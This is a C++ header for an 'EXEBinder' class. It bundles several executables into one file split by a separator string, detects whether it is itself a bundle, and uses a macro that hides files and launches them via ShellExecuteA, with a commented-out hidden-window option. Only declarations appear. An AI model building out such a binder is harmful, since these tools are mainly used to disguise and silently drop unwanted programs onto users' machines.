#pragma once

#include <Windows.h>

#include <fstream>
#include <vector>
#include <string>

#include "Miscellaneous.hpp"

#define SEPARATOR "*****"
#define SEPARATOR_SIZE strlen(SEPARATOR)

#define ExecuteAndHide(exe, hide) if (hide) SetFileAttributesA(exe, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY); ShellExecuteA(nullptr, "open", exe, nullptr, nullptr, /*SW_HIDE*/ SW_NORMAL);

class EXEBinder {
public:
	EXEBinder();
	~EXEBinder();

	void Bind(const std::vector<std::string>& files, const std::string& fileBinded, const std::string& fileOpener);
	void Open(const std::string& file);
	
	inline bool AmIBinded(const std::string& myName) {
		if(!Miscellaneous::FileExists(myName)) {
			return false;
		}
		
		std::string data;
		Miscellaneous::FileAsString(myName, data);

		std::vector<size_t> occurancesPoss;
		Miscellaneous::FindAllOccurrences(data, SEPARATOR, occurancesPoss);

		return occurancesPoss.size() > 1;
	}
};